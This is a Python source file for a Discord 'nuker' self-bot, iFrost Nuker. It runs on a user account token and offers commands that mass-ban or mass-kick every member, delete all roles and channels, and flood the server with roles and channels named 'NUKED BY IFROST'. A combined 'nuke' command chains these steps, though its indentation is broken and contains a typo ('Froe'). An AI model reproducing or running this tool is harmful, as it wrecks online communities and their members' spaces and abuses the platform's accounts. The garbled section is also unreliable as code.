# IFROST NUKER MADE BY IFROST

# IF YOU WANNA SKID THIS, SLIDE US SOME CREDITS < 3

# BEGINNING OF CODE:

class NUKER():
    __version__ = 2.5

import discord
import termcolor
import os
import colorama
import webbrowser
from discord.ext import commands
from discord.ext import tasks
from termcolor import colored
from colorama import Fore, init

token = "TOKEN-HERE"
prefix = "ifr"
myID = "ID-HERE"

os.system('cls')
print(f'{Fore.BLUE}L O A D I N G . . .')

bot = commands.Bot(command_prefix=prefix, self_bot=True)
bot.remove_command("help")
boy = discord.Client()

@bot.event
async def on_connect():
    os.system('cls')
    print(f'''{Fore.MAGENTA}
                       ██▓ █████▒ ██▀███   ▒█████   ██████ ▄▄▄█████▓     ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  
                      ▓██▒▓██   ▒▓██ ▒ ██▒▒██▒  ██▒▒██    ▒ ▓  ██▒ ▓▒    ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
                      ▒██▒ ████ ░▓██ ░▄█ ▒▒██░  ██▒░ ▓██▄   ▒ ▓██░ ▒░   ▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ███    ▓██ ░▄█ ▒
                      ░██░░▓█▒  ░▒██▀▀█▄  ▒██   ██░  ▒   ██▒░ ▓██▓ ░    ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▓█  ▄ ▒██▀▀█▄  
                      ░██░░▒█░   ░██▓ ▒██▒░ ████▓▒░▒██████▒▒  ▒██▒ ░    ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄████▒░ ██▓ ▒██▒
                      ░▓   ▒ ░   ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░  ▒ ░░      ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
                       ▒ ░ ░       ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░▒  ░ ░    ░       ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
                       ▒ ░ ░ ░     ░░   ░ ░ ░ ░ ▒  ░  ░  ░    ░            ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░ 
                       ░            ░         ░ ░        ░                       ░    ░     ░  ░      ░  ░   ░     
                                                            {Fore.MAGENTA}IFROST NUKER
    ''')
    print(f'{Fore.BLUE}                      iFrost Nuker Version | {NUKER.__version__}')
    print(f'{Fore.MAGENTA}                      Logged in as: | {bot.user.name}#{bot.user.discriminator}')
    print(f'{Fore.YELLOW}                      User ID | {bot.user.id}')
    print(f'{Fore.GREEN}                      Prefix | {prefix}')
    print(f'{Fore.RED}                      Type {prefix}help to see the help commands printed in console!')
    print('')
   
@bot.command()
async def ping(ctx):
    await ctx.message.delete()
    await ctx.send('Pong!')
    await ctx.send(f'``Your ping is: {round(bot.latency * 1000)} ms!``')

@bot.command()
async def banAll(ctx):
    await ctx.message.delete()
    await ctx.send('Now banning all server members..')
    await ctx.send('Please wait...')
    print(f'{Fore.RED}Banning proccession has begun!')
    for member in ctx.guild.members:
        try:
            await member.ban()
        except:
            continue

@bot.command()
async def kickAll(ctx):
    await ctx.message.delete()
    await ctx.send('Now kicking all server members..')
    await ctx.send('Please wait...')
    print(f'{Fore.RED}Kicking proccession has begun!')
    for member in ctx.guild.members:
        try:
            await member.kick()
        except:
            continue

@bot.command()
async def role(ctx, choice):
    if choice == 'create':
        await ctx.message.delete()
        await ctx.send('Spamming role creation..')
        await ctx.send('Please wait...')
        print('Spam role creating procession has begun!')
        for i in range(1, 25):
            await ctx.guild.create_role(name=f'NUKED BY IFROST {i}')
    elif choice == 'delete':
        await ctx.message.delete()
        await ctx.send('Spamming role deletion..')
        await ctx.send('Please wait...')
        print('Spam role deleting procession has begun!')
        roles = ctx.guild.roles
        roles.pop(0)
        for role in roles:
            if ctx.guild.me.roles[-1] > role:
                await role.delete()
            else:
                await ctx.send('There was an error while deleting the roles.')
    else:
        await ctx.send('Not a valid option.')

@bot.command()
async def channel(ctx, choice):
    if choice == 'create':
        await ctx.message.delete()
        await ctx.send('Spamming channel creation..')
        await ctx.send('Please wait...')
        print('Spam channel creating procession has begun!')
        for i in range(1, 25):
            await ctx.guild.create_text_channel(name=f'NUKED-BY-IFROST {i}')
            await ctx.guild.create_voice_channel(name=f'NUKED BY IFROST {i}')
            await ctx.guild.create_category(name=f'NUKED BY IFROST {i}')
    elif choice == 'delete':
        await ctx.message.delete()
        await ctx.send('Spamming channel deletion..')
        await ctx.send('Please wait...')
        print('Spam channel deleting procession has begun!')
        for channel in ctx.guild.channels:
                await channel.delete()
    else:
        await ctx.send('Not a valid option.')

@bot.command(aliases=['shutdown', 'off', 'deactivate', 'stop', 'end', 'turnoff'])
async def logout(ctx):
    if ctx.author.id == bot.user.id:
        await ctx.message.delete()
        os.system('cls')
        print(f'{Fore.RED}L O G G E D   O U T . . .')
        print(f'{Fore.RED}K I L L   T H I S   T E R M I N A L   T O   R E - R U N . . .')
        await bot.logout()
    else:
        print(f'{Fore.RED}Someone tried to use the logout command.')

@bot.command(aliases=['wizz', 'nuke', 'destroy', 'fuckupserver'])
async def execute(ctx): 
    await ctx.message.delete()
    await ctx.send('We are on it!')
    print(f'{Fore.RED}Nuking proccession has begun!')
    print('')
    print(f'{Fore.RED}Banning proccession has begun!')
    print('')
    for member in ctx.guild.members:
        try:
            await member.ban()
    print(f'{Fore.GREEN}Banning proccession has been complete.')
    print('')
        except:
            continue

        print(f'{Fore.RED}Spam role deleting proccession has begun!')
        print('')
        roles = ctx.guild.roles
        roles.pop(0)
        for role in roles:
            if ctx.guild.me.roles[-1] > role:
                await role.delete()
        print(f'{Fore.GREEN}Spam role deleting proccession has been complete.')
        print('')
            else:
                await ctx.send('There was an error while deleting the roles.')
        print(f'{Fore.RED}Spam role and channel creating proccession has begun!')
        print('')
        
        for i in range(1, 25):
                await ctx.guild.create_role(name=f'NUKED BY IFROST {i}')
                await ctx.guild.create_text_channel(name=f'NUKED-BY-IFROST {i}')
                await ctx.guild.create_voice_channel(name=f'NUKED BY IFROST {i}')
                await ctx.guild.create_category(name=f'NUKED BY IFROST {i}')
        print(f'{Fore.GREEN}Spam role and channel creating proccession has been complete.')
        print('')
        print(f'{Fore.RED}Spam channel deleting proccession has begun!')
        print('')
        for channel in ctx.guild.channels:
                await channel.delete()
        print(f'{Froe.GREEN}Spam channel deleting proccession has been complete.')
        print('')

@bot.command(aliases=['commands'])
async def help(ctx):
    await ctx.message.delete()
    print(f'{Fore.BLUE}[ping] - Shows the bot\'s ping!')
    print(f'{Fore.BLUE}[banAll] - Bans all server members!')
    print(f'{Fore.BLUE}[kickAll] - Kicks all server members!')
    print(f'{Fore.BLUE}[role create] - Creates 25 roles!')
    print(f'{Fore.BLUE}[role delete] - Deletes all server roles!')
    print(f'{Fore.BLUE}[channel create] - Creates 25 channels!')
    print(f'{Fore.BLUE}[channel delete] - Deletes all server channels!')
    print(f'{Fore.BLUE}[execute/wizz/nuke/destroy/fuckupserver] - Destroys & nukes the entire server!')
    print(f'{Fore.BLUE}[logout/off/shutdown/deactivate/stop/end] - Logs out and stops the nuker!')
    print('')


# ACTIVATOR:

bot.run(token, bot=False)



